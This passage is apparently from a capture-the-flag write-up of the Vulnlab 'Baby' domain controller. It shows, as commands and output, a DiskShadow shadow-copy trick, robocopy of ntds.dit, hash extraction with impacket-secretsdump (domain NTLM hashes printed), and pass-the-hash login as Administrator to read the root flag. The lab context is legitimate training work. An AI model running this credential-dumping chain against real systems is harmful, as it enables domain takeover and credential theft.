+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><em>Convert the file to DOS format:</em></p>
+<pre><code>destiny@falcon:~/vulnlab.com/Baby-W$ unix2dos diskshadow.dsh
+unix2dos: converting file diskshadow.dsh to DOS format...
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><em>Upload the&nbsp;<code>.dsh</code>&nbsp;file to the victim machine:</em></p>
+<pre><code>*Evil-WinRM* PS C:\Windows\temp&gt; upload diskshadow.dsh
+
+Info: Uploading /home/destiny/vulnlab.com/Baby-W/diskshadow.dsh to C:\Windows\temp\diskshadow.dsh
+
+Data: 128 bytes of 128 bytes copied
+
+Info: Upload successful!
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><em>Execute the&nbsp;<code>diskshadow</code>&nbsp;command on the victim machine to process the&nbsp;<code>.dsh</code>&nbsp;file:</em></p>
+<pre><code>*Evil-WinRM* PS C:\Windows\temp&gt; diskshadow /s diskshadow.dsh
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  BABYDC,  12/10/2024 4:42:47 PM
+
+-&gt; set context persistent nowriters
+-&gt; add volume c: alias persecure
+-&gt; create
+Alias persecure for shadow ID {00c44bca-56f0-4e40-a5d0-cc8911e527fd} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {9d386d70-5ce4-4aa9-ba4f-02d81d01c7b5} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {9d386d70-5ce4-4aa9-ba4f-02d81d01c7b5}
+
+        * Shadow copy ID = {00c44bca-56f0-4e40-a5d0-cc8911e527fd}               %persecure%
+                - Shadow copy set: {9d386d70-5ce4-4aa9-ba4f-02d81d01c7b5}       %VSS_SHADOW_SET%
+                - Original count of shadow copies = 1
+                - Original volume name: \\?\Volume{1b77e212-0000-0000-0000-100000000000}\ [C:\]
+                - Creation time: 12/10/2024 4:42:48 PM
+                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+                - Originating machine: BabyDC.baby.vl
+                - Service machine: BabyDC.baby.vl
+                - Not exposed
+                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-&gt; expose %persecure% z:
+-&gt; %persecure% = {00c44bca-56f0-4e40-a5d0-cc8911e527fd}
+The shadow copy was successfully exposed as z:\.
+-&gt;
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><em>Use the&nbsp;<code>robocopy</code>&nbsp;command in backup mode (<code>/b</code>) to copy the&nbsp;<code>ntds.dit</code>&nbsp;file from the exposed volume:</em></p>
+<pre><code>*Evil-WinRM* PS C:\Windows\temp&gt; robocopy /b z:\windows\ntds . ntds.dit&nbsp;
+.
+.
+1.9%
+100%
+
+------------------------------------------------------------------------------
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Dirs :         1         0         1         0         0         0
+   Files :         1         1         0         0         0         0
+   Bytes :   16.00 m   16.00 m         0         0         0         0
+   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+
+
+   Speed :           97,541,953 Bytes/sec.
+   Speed :            5,581.396 MegaBytes/min.
+   Ended : Tuesday, December 10, 2024 4:44:10 PM
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><em>Verify the presence of the copied&nbsp;<code>ntds.dit</code>&nbsp;file in the&nbsp;<code>C:\Windows\temp</code>&nbsp;directory and downloaded the file</em></p>
+<pre><code>*Evil-WinRM* PS C:\Windows\temp&gt; ls
+
+Directory: C:\Windows\temp
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        12/10/2024   4:42 PM            624 2024-12-10_16-42-48_BABYDC.cab
+-a----        12/10/2024   4:42 PM             96 diskshadow.dsh
+-a----        12/10/2024   4:16 PM       16777216 ntds.dit
+-a----        12/10/2024   4:17 PM            102 silconfig.log
+
+
+*Evil-WinRM* PS C:\Windows\temp&gt; download ntds.dit
+Info: Downloading C:\Windows\temp\ntds.dit to ntds.dit
+Info: Download successful!
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">Finally we used&nbsp;<strong>Impacket's&nbsp;<code>secretsdump</code></strong>&nbsp;tool to extract credentials from the&nbsp;<code>ntds.dit</code>&nbsp;file.  <em>We had the SYSTEM file from the previous download</em></p>
+<pre><code>destiny@falcon:~/vulnlab.com/Baby-W$ impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies            [*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                        
+[*] Searching for pekList, be patient                                             
+[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
+[*] Reading and decrypting hashes from ntds.dit                                                                                                                      
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:8cbfd74084914e396b1c6fd420d3fe5e:::                                                                                    
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
+baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
+baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::                      
+baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">Used&nbsp;<strong>Evil-WinRM</strong>&nbsp;to connect as Administrator using the extracted NTLM hash and get the root flag:</p>
+<pre><code>destiny@falcon:~/vulnlab.com/Baby-W$ evil-winrm -i 10.10.70.114 -u "administrator" -H "ee4457ae59f1e3fbd764e33d9cef123d"
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+VL{9000cab96bcf62e99073ff5f6653ce90}
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<hr>
